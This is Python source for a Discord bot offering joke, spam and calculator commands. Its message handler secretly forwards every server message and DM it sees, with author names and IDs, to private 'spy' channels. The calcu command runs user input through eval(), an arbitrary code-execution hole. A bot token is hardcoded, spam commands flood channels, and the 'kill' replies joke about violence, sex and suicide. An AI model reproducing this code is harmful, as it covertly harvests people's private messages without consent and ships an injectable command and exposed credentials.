import discord
import os
from discord.ext import commands,tasks
import asyncio
import random
import math
import datetime
import time
import youtube_dl

client = commands.Bot(command_prefix = "%")

@client.event
async def on_ready():
  global ConsoleChannel
  ConsoleChannel = client.get_channel(856882963107282967)
  await ConsoleChannel.send("{0.user} have started working.".format(client))
  global SpyChannel
  SpyChannel = client.get_channel(857191746827583498)
  global DMChannel
  DMChannel = client.get_channel(857192290551201832)
  global spamChannel
  spamChannel = [810744659721977907,815114035124502528,805150557781098559,856914998660300860,857192290551201832,857191746827583498]
  global calcuChannel
  calcuChannel = [856192688768286780]
  global idname
  idname = []
  global member
  member = list(discord.Member)
  global NoSpy
  NoSpy = False

@client.command()
async def send(ctx,channelID : int,txt):
  SendChannel = client.get_channel(channelID)
  await SendChannel.send(txt)

@client.command()
async def DM(ctx,user : discord.User,txt):
  await user.send(txt)

@client.command()
async def spy(ctx,Bool1 : bool):
    global NoSpy
    if Bool1 == False:
        if NoSpy == False:
            await ConsoleChannel.send("Stop spy!")
            NoSpy = True
        else:
            await ctx.send("Already stop spying")
    else:
        if NoSpy == True:
            await ConsoleChannel.send("Start spying!")
            NoSpy = False
        else:
            await ctx.send("Already spying")

@client.event
async def on_message(message):
  if message.author == client.user:
    return
  if NoSpy != True:
    if message.channel.id not in spamChannel:
        if message.channel.type != discord.ChannelType.private:
            if message.content.startswith(message.content):
                mesSend = str(message.author.name+str(message.author.id)+" server,channel: "+message.guild.name+str(message.guild.id) + ","+ message.channel.name +":"+str(message.channel.id) + " wrote "+  "'"+message.content+"'")
                await SpyChannel.send(mesSend)
        else:
            if message.content.startswith(message.content):
                DM = str(message.author.name+str(message.author.id)+" wrote DM "+  "'"+message.content+"'")
                await DMChannel.send(DM)

  await client.process_commands(message)

@client.event
async def on_command_error(ctx,error):
    await ctx.send(error)

@client.command()
async def time(ctx):
    local_time = datetime.datetime.now()
    current = datetime.datetime.now().strftime("%H:%M:%S")
    await ctx.send("Year:"+str(local_time.year)+"\n Month-date:"+str(local_time.month)+":"+str(local_time.day)+"\n Time:"+str(current))

@client.command()
async def list(ctx):
  await ctx.send("command list: ""\n %spam is command to spam whatever you want(use %how_spam to know how to use it)" "\n %calcu to calculate whatever youwant(use %how_calcu to know how to use it)" "\n %print to make bot send whatever you want" "\n %quote to quote whatever you want" "\n %shutdown to turn off bot")

@client.command()
async def covidThai(ctx):
    await ctx.send("https://covid19.workpointnews.com/" "\n ^ click here to check the covid statistic in Thailand")

@client.command()
async def covid(ctx):
    await ctx.send("https://www.worldometers.info/coronavirus/" "\n ^ click here to see the covid statistic worldwide")

@client.command()
async def kill(ctx,*,user : discord.Member):
    response = ["{0} stabbed {1} to death.","{0} drowned {1} to death.","{0} shot {1} in the head.","{0} fucked {1} to death.","{1} died from laughing to death","{1} masturbated to death","{1} fell down from the bed to death","{0} pushed {1} from a building to death","{1} died from drugs overused",
                "{0} roasted {1} to death."]
    pick = random.choice(response)
    if ctx.author != user:
        await ctx.send(pick.format(ctx.author.mention,user.mention))
    elif ctx.author == user:
        await ctx.send(" {} comitted suicide".format(ctx.author.mention))

@client.command()
async def suicide(ctx):
    await ctx.send(" {} comitted suicide".format(ctx.author.mention))

@client.command()
async def print(ctx,*,txt):
    await ctx.send(txt)

@client.command()
async def for_loop_tup(ctx,tuple1):
  for x in tuple1:
    await ctx.send(x)

@client.command()
async def quote(ctx,txt,ID : discord.Member=None):
    if ID == None:
        await ctx.send('"'+txt+'"' '\n' '\n       -{0}, {1}'.format(ctx.author,datetime.datetime.now().year))
    else:
        await ctx.send('"'+txt+'"' '\n' '\n       -{0}, {1}'.format(ID,datetime.datetime.now().year))

@client.command()
async def how_spam(ctx):
    await ctx.send("Type %spam \"<What text do you want to spam>\" and <How many times do you want to spam>" "\n type %stop to stop spam" "\n type %set_spam_channel \"<Channel ID(you can get this from right click the channel tab)>\"")

@client.command()
async def how_calcu(ctx):
  await ctx.send("Type %calcu and <What do you want to calculate> ,with no spaces between the numbers and the operators")

@client.command()
async def test(ctx):
  await ConsoleChannel.send("Work!")
  await ctx.send("Work!")

@client.command()
async def calcu(ctx,txt):
  if ctx.guild.id == 805469981655433256:
    if ctx.channel.id in calcuChannel:
      if " " in txt:
        await ctx.send("Error,there are spaces between numbers and operators")
      elif '/0' in txt:
        await ctx.send("Error,there is divide by 0")
      else:
        ans = eval(txt)
        await ctx.send(ans)
    else:
      await ctx.send("This is not the calcutor channel")
  else:
    if " " in txt:
      await ctx.send("Error,there are spaces between numbers and operators")
    elif '/0' in txt:
      await ctx.send("Error,there is divide by 0")
    else:
        ans = eval(txt)
        await ctx.send(ans)


@client.command()
async def stop(ctx):
  global stop
  if ctx.author.id in idname:
    stop = True
    await asyncio.sleep(3)
    stop = False
  elif ctx.author.guild_permissions.administrator == True:
    stop = True
    await asyncio.sleep(3)
    stop = False
  else:
    await ctx.send("You are not the person who start the spam nor the adiministrator")

@client.command()
async def set_spam_channel(ctx,channelID : int):
  if ctx.author.guild_permissions.administrator == True:
    global spamChannel
    spamChannel.append(channelID)
    await ctx.send("That channel is now a spam channel")
  elif channelID in spamChannel:
      await ctx.send("That channel was already a spam channel")

@client.command()
async def remove_spam_channel(ctx,channelID : int):
    if channelID in spamChannel:
        spamChannel.remove(channelID)
        await ctx.send("Removed!")
    else:
        await ctx.send("That channel wasn't a spam channel")


@client.command()
async def spam(ctx,arg,times : int):
  idname.append(ctx.author.id)
  if ctx.channel.id in spamChannel:
    if times <= 1000:
      await ConsoleChannel.send("Spam Command works")
      await asyncio.sleep(0.5)
      z = 0
      while z < times:
        if stop == True: 
           await ConsoleChannel.send("Loop has been stop by %stop")
           await ctx.send("Loop has been stop by %stop")
           break 
        await ctx.send(arg)
        z += 1
        if z == 10 * 1:
          await ctx.send(arg + " Loop has reached 10 times")
          pass
        if z == 10 * 2:
          await ctx.send(arg + " Loop has reached 20 times")
          pass
        if z == 10 * 3:
          await ctx.send(arg + " Loop has reached 30 times")
          pass
        if z == 10 * 4:
          await ctx.send(arg + " Loop has reached 40 times")
          pass
        if z == 10 * 5:
          await ctx.send(arg + " Loop has reached 50 times")
          pass
        if z == 10 * 10:
          await ctx.send(arg + " Loop has reached 100 times")
          pass
        if z == 10 * 15:
          await ctx.send(arg + " Loop has reached 150 times")
          pass
        if z == 10 * 20:
          await ctx.send(arg + " Loop has reached 200 times")
          pass
        if z == 10 * 25:
          await ctx.send(arg + " Loop has reached 250 times")
          pass
        if z == 10 * 30:
          await ctx.send(arg + " Loop has reached 300 times")
          pass
        if z == 10 * 35:
          await ctx.send(arg + " Loop has reached 350 times")
          pass
        if z == 10 * 40:
          await ctx.send(arg + " Loop has reached 400 times")
          pass
        if z == 10 * 45:
          await ctx.send(arg + " Loop has reached 450 times")
          pass
        if z == 10 * 50:
          await ctx.send(arg + " Loop has reached 500 times")
          pass
        if z == 10 * 100:
          await ctx.send(arg + " Loop has reached 1,000 times")
          pass
      else:
        await ConsoleChannel.send(arg+"Loop has finished")
        await ctx.send(arg+"Loop has finished")
    else:
      await ctx.send("Spam times is too many,more than 1,000 times")
  else:
     await ctx.send("This is not the spam channel")

@client.command()
async def infspam(ctx,*,txt):
  if ctx.channel.id not in spamChannel:
    idname.append(ctx.author.id)
    while stop != False:
      await ctx.send(txt)
    else:
      await ctx.send("Loop has been stop by %stop")

@client.command()
async def shutdown(ctx):
  await ctx.send("Good bye")
  await asyncio.sleep(2)
  await quit()
   
TOKEN1 =   'ODU0MDA4MjI2Njk3MzE0Mzg0.YMdrIw.vUjlIv7trZrvog_BEvZeA4vicGE'
client.run(TOKEN1)
#Made By HoAi,All creadits belong to HoAi
